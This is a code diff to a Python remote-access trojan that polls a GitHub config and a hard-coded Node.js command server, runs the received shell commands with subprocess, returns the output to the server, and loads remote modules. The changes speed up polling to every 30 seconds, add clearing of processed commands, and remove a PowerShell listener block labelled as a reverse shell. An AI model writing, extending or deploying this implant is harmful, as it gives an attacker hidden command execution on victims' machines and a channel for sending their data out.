@@ -33,7 +33,6 @@ class Trojan:
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             decoded_config = base64.b64decode(config_json).decode('utf-8')
-            # print(f"Decoded config JSON: {decoded_config}")  # Debug output
             return json.loads(decoded_config)
         except Exception as e:
             print(f"Error fetching GitHub config: {e}")
@@ -46,6 +45,12 @@ class Trojan:
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to get config from Node.js server: {e}")
             return None
+
+    def clear_nodejs_config(self):
+        try:
+            requests.delete(f"{self.node_server_url}/config/clear")
+        except requests.exceptions.RequestException as e:
+            print(f"[*] Failed to clear config on Node.js server: {e}")
 
     def send_command_result(self, command, result):
         try:
@@ -74,7 +79,7 @@ class Trojan:
                 shell_command = command.get('command')
                 if shell_command:
                     try:
-                        print(f"[*] Executing command: {shell_command}")  # Debug output
+                        print(f"[*] Executing command: {shell_command}")
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
                     except subprocess.CalledProcessError as e:
@@ -83,21 +88,10 @@ class Trojan:
             elif command_type == 'module':
                 module_name = command.get('module')
                 if module_name:
-                    if module_name == 'reverse':
-                        # Use PowerShell to start a listener
-                        shell_command = 'powershell -Command "New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 8000).Start(); while ($true) { $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $bytesRead = $stream.Read($buffer, 0, $buffer.Length); if ($bytesRead -gt 0) { $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead); [Console]::WriteLine($data); } $client.Close(); }"'
-                        try:
-                            print(f"[*] Executing reverse shell command: {shell_command}")  # Debug output
-                            result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
-                            result = result.decode('utf-8')
-                        except subprocess.CalledProcessError as e:
-                            result = e.output.decode('utf-8')
-                        self.send_command_result(shell_command, result)
-                    else:
-                        if module_name not in sys.modules:
-                            importlib.import_module(module_name)
-                        thread = threading.Thread(target=self.module_runner, args=(module_name,))
-                        thread.start()
+                    if module_name not in sys.modules:
+                        importlib.import_module(module_name)
+                    thread = threading.Thread(target=self.module_runner, args=(module_name,))
+                    thread.start()
         else:
             print(f"Invalid command format: {command}")
 
@@ -125,7 +119,10 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-            time.sleep(random.randint(30*60, 3*60*60))
+                self.clear_nodejs_config()  # Clear commands after processing
+
+            # Check for new commands every 30 seconds instead of random long intervals
+            time.sleep(30)
 
 class GitImporter:
     def __init__(self):
@@ -154,4 +151,3 @@ if __name__ == '__main__':
     NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
     trojan = Trojan('abc', NODE_SERVER_URL)
     trojan.run()
-
